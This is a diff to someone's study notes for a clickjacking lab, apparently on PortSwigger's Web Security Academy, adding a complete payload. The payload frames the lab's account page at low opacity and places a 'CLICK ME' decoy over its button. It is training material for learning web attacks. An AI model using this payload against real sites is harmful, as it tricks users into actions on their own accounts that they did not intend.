@@ -40,3 +40,26 @@ The victim will be using Chrome so test your exploit on that browser.
 iframe:- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe
 
 CSS:- https://developer.mozilla.org/en-US/docs/Web/CSS
+
+==click jacking code:==  for this lab
+```
+<style>
+
+iframe{
+position:relative;
+        width:1000px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+
+}
+div{
+Position:absolute;
+top:515px;
+left:60px;
+z-index: 1;
+}
+</style>
+<div>CLICK ME</div>
+<iframe src= "https://0aed002e0411e037808830210079002f.web-security-academy.net/my-account?id=wiener"></iframe>
+```
